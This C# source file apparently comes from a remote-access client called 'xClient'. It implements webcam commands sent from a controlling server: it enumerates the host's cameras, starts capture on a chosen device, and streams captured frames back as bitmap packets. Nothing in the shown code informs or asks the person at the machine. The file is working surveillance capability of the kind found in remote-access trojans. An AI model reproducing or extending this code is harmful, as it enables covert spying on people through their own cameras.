using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using AForge.Video;
using AForge.Video.DirectShow;
using xClient.Core.Networking;
using xClient.Core.Packets.ClientPackets;
using xClient.Core.Packets.ServerPackets;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT HANDLE WEBCAM COMMANDS. */

    public static partial class CommandHandler
    {
        public static bool WebcamStarted;
        public static bool NeedsCapture;
        public static Client Client;
        public static int Webcam;
        public static VideoCaptureDevice FinalVideo;

        public static void HandleGetWebcams(GetWebcams command, Client client)
        {
            var result = new List<string>();
            var videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            foreach (FilterInfo videoCaptureDevice in videoCaptureDevices)
            {
                result.Add(videoCaptureDevice.Name);
            }
            if (result.Count > 0)
                new GetWebcamsResponse(result).Execute(client);
        }

        public static void HandleGetWebcam(GetWebcam command, Client client)
        {
            Client = client;
            NeedsCapture = true;
            Webcam = command.Webcam;
            if (!WebcamStarted)
            {
                var videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                FinalVideo = new VideoCaptureDevice(videoCaptureDevices[command.Webcam].MonikerString);
                FinalVideo.NewFrame += FinalVideo_NewFrame;
                FinalVideo.Start();
                WebcamStarted = true;
            }
        }

        public static void HandleDoWebcamStop(DoWebcamStop command, Client client)
        {
            NeedsCapture = false;
            WebcamStarted = false;
            Client = null;
            if (FinalVideo != null)
            {
                FinalVideo.NewFrame -= FinalVideo_NewFrame;
                FinalVideo.Stop();
                FinalVideo = null;
            }
        }

        private static void FinalVideo_NewFrame(object sender, NewFrameEventArgs e)
        {
            if (!WebcamStarted)
                FinalVideo.Stop();

            if (NeedsCapture)
            {
                var image = (Bitmap) e.Frame.Clone();
                using (var stream = new MemoryStream())
                {
                    image.Save(stream, ImageFormat.Bmp);
                    new GetWebcamResponse(stream.ToArray(), Webcam).Execute(Client);
                    stream.Close();
                }
                NeedsCapture = false;
            }
        }
    }
}